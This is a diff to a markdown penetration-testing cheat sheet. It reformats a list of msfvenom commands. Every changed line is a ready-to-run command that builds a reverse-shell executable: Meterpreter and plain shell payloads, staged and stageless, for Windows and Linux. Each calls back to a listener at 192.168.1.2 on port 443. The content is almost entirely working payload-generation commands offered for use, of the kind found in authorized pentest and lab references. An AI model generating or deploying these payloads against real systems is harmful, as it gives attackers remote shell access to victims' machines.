@@ -67,7 +67,7 @@
 
 * Msfvenom
 
-  * Windows
+* Windows
 
 * Meterpreter (Metasploit Listener multi/handler) [Staged]
 
@@ -87,7 +87,7 @@
 
   * x64 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe```
 
-  * Linux
+* Linux
 
 * Meterpreter (Metasploit Listener multi/handler) [Staged]
 
@@ -95,14 +95,14 @@
 
   * x64 ```msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
 
-### Shell (Metasploit Listener multi/handler) [Staged]
+* Shell (Metasploit Listener multi/handler) [Staged]
 
-x86 > ```msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
+  * x86 ```msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
 
-x64 > ```msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
+  * x64 ```msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
 
-### Shell (Netcat Listener) [Stageless]
+* Shell (Netcat Listener) [Stageless]
 
-x86 > ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
+  * x86 ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
 
-x64 > ```msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
+  * x64 ```msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf```
